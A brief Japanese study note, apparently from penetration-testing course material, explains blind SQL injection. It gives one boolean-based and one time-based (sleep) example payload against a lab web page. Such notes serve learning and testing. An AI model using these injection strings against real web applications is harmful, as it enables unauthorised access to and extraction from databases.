データベース応答が返されず、ブールベースまたは時間ベースのロジックを使用して動作が推測されるシナリオ

# ブールベース

```bash
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

# 時間ベース
```bash
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
ステートメント自体の中では常に true になるが、ユーザーが存在しない場合は false を返す IF 条件を追加
